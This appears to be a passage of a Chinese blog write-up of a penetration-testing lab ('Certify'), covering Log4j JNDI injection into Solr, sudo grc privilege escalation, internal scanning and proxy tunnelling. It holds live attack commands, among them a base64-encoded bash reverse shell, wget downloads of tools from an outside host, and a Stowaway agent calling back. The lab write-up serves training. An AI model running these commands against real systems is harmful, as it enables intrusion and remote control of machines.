@@ -1,0 +1,525 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="log4j、smb未授权、Kerberoasting攻击、ADCS ESC1"><title>春秋云镜Certify</title><link rel=canonical href=https://baozongwi.xyz/p/spring-autumn-mirror-certify/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="春秋云镜Certify"><meta property='og:description' content="log4j、smb未授权、Kerberoasting攻击、ADCS ESC1"><meta property='og:url' content='https://baozongwi.xyz/p/spring-autumn-mirror-certify/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pentest'><meta property='article:published_time' content='2025-08-22T17:48:09+08:00'><meta property='article:modified_time' content='2025-08-22T17:48:09+08:00'><meta name=twitter:title content="春秋云镜Certify"><meta name=twitter:description content="log4j、smb未授权、Kerberoasting攻击、ADCS ESC1"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3flag4>flag3&&amp;flag4</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/>春秋云镜</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/spring-autumn-mirror-certify/>春秋云镜Certify</a></h2><h3 class=article-subtitle>log4j、smb未授权、Kerberoasting攻击、ADCS ESC1</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-08-22T17:48:09+08:00>Aug 22, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 174 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=flag1>flag1</h2><p>访问不出来正常服务，fscan扫一下， <code>./fscan -h 39.98.108.206 -p 0-65535</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>39.98.108.206:22 open
+</span></span><span class=line><span class=cl>39.98.108.206:80 open
+</span></span><span class=line><span class=cl>39.98.108.206:8983 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>3</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.98.108.206      code:200 len:612    title:Welcome to nginx!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.98.108.206:8983 code:302 len:0      title:None 跳转url: http://39.98.108.206:8983/solr/
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.98.108.206:8983/solr/ code:200 len:16555  title:Solr Admin
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spring-autumn-mirror-certify/1.png width=1289 height=872 loading=lazy alt=1></p><p>发现了log4j，搜一下就知道路由了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://39.98.124.32:8983/solr/admin/cores?action=${jndi:ldap://oqoloubyms.dgrh3.cn}
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spring-autumn-mirror-certify/2.png width=1464 height=501 loading=lazy alt=1></p><p>成功了，那我们反弹shell <a class=link href=https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0 target=_blank rel=noopener>https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>9999</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class=s2>&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNy4xNDguMjI3Lzk5OTkgMD4mMQ==}|{base64,-d}|bash&#34;</span> -A 8.137.148.227
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>http://39.98.124.32:8983/solr/admin/cores?action<span class=o>=</span><span class=si>${</span><span class=nv>jndi</span><span class=p>:</span><span class=nv>ldap</span><span class=p>://47.109.176.117:</span><span class=nv>1389</span><span class=p>/gyq4c3</span><span class=si>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>挨个试，成功反弹shell</p><p><img src=/p/spring-autumn-mirror-certify/3.png width=855 height=264 loading=lazy alt=1></p><p>sudo配置有安全问题，可以提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>solr@ubuntu:~$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> solr on ubuntu:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User solr may run the following commands on ubuntu:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/grc
+</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://gtfobins.github.io/gtfobins/grc/ target=_blank rel=noopener>https://gtfobins.github.io/gtfobins/grc/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo grc whoami
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo grc ls /root/
+</span></span><span class=line><span class=cl>sudo grc ls /root/flag
+</span></span><span class=line><span class=cl>sudo grc tac /root/flag/flag01.txt
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag2>flag2</h2><p>把fscan和stowaway通过wget传上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wget http://47.109.176.117/fscan
+</span></span><span class=line><span class=cl>wget http://47.109.176.117/linux_x64_agent
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>chmod +x *
+</span></span></code></pre></td></tr></table></div></div><p>先扫描一下内网</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>solr@ubuntu:/tmp$ ifconfig
+</span></span><span class=line><span class=cl>ifconfig
+</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
+</span></span><span class=line><span class=cl>        inet 172.22.9.19  netmask 255.255.0.0  broadcast 172.22.255.255
+</span></span><span class=line><span class=cl>        inet6 fe80::216:3eff:fe18:2972  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span class=line><span class=cl>        ether 00:16:3e:18:29:72  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>185305</span>  bytes <span class=m>135483216</span> <span class=o>(</span>135.4 MB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>110159</span>  bytes <span class=m>9288680</span> <span class=o>(</span>9.2 MB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
+</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>1550</span>  bytes <span class=m>178290</span> <span class=o>(</span>178.2 KB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>1550</span>  bytes <span class=m>178290</span> <span class=o>(</span>178.2 KB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>solr@ubuntu:/tmp$ ./fscan -h 172.22.9.19/24
+</span></span><span class=line><span class=cl>./fscan -h 172.22.9.19/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __ 
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;    
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>  
+</span></span><span class=line><span class=cl>                     fscan version: 1.8.4
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl>trying RunIcmp2
+</span></span><span class=line><span class=cl>The current user permissions unable to send icmp packets
+</span></span><span class=line><span class=cl>start ping
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.9.7      is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.9.19     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.9.47     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.9.26     is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>172.22.9.26:445 open
+</span></span><span class=line><span class=cl>172.22.9.7:445 open
+</span></span><span class=line><span class=cl>172.22.9.47:445 open
+</span></span><span class=line><span class=cl>172.22.9.26:139 open
+</span></span><span class=line><span class=cl>172.22.9.47:139 open
+</span></span><span class=line><span class=cl>172.22.9.7:139 open
+</span></span><span class=line><span class=cl>172.22.9.26:135 open
+</span></span><span class=line><span class=cl>172.22.9.7:135 open
+</span></span><span class=line><span class=cl>172.22.9.47:80 open
+</span></span><span class=line><span class=cl>172.22.9.7:80 open
+</span></span><span class=line><span class=cl>172.22.9.19:80 open
+</span></span><span class=line><span class=cl>172.22.9.47:22 open
+</span></span><span class=line><span class=cl>172.22.9.47:21 open
+</span></span><span class=line><span class=cl>172.22.9.19:22 open
+</span></span><span class=line><span class=cl>172.22.9.19:8983 open
+</span></span><span class=line><span class=cl>172.22.9.7:88 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>16</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.9.26
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DESKTOP-CBKTVMO
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.9.26
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.9.7      <span class=o>[</span>+<span class=o>]</span> DC:XIAORANG<span class=se>\X</span>IAORANG-DC    
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.9.7
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>XIAORANG-DC
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.9.7
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.9.47     fileserver                          Windows 6.1
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        �Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.9.47  <span class=o>(</span>Windows 6.1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 
+</span></span><span class=line><span class=cl>已完成 15/16 <span class=o>[</span>-<span class=o>]</span> ftp 172.22.9.47:21 ftp ftp111 <span class=m>530</span> Login incorrect. 
+</span></span><span class=line><span class=cl>已完成 15/16 <span class=o>[</span>-<span class=o>]</span> ftp 172.22.9.47:21 ftp <span class=m>666666</span> <span class=m>530</span> Login incorrect. 
+</span></span><span class=line><span class=cl>已完成 15/16 <span class=o>[</span>-<span class=o>]</span> ftp 172.22.9.47:21 ftp Aa12345. <span class=m>530</span> Login incorrect. 
+</span></span></code></pre></td></tr></table></div></div><ul><li>172.22.9.7 XIAORANG\XIAORANG-DC</li><li>172.22.9.19 已拿下</li><li>172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab</li><li>172.22.9.47 fileserver</li></ul><p>利用Stowaway搭建代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./linux_x64_admin -l <span class=m>2334</span> -s <span class=m>123</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./linux_x64_agent -c 47.109.176.117:2334 -s <span class=m>123</span> --reconnect <span class=m>8</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>use <span class=m>0</span>
+</span></span><span class=line><span class=cl>socks <span class=m>5555</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo vim /etc/proxychains4.conf
+</span></span></code></pre></td></tr></table></div></div><p>fileserver一般会开启smbclient，利用nmap来进行端口扫描，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 nmap -sT -Pn -n --top-ports <span class=m>1000</span> 172.22.9.47
+</span></span><span class=line><span class=cl><span class=c1># 或者全扫描</span>
+</span></span><span class=line><span class=cl>proxychains4 nmap -sT -Pn -n -p- 172.22.9.47
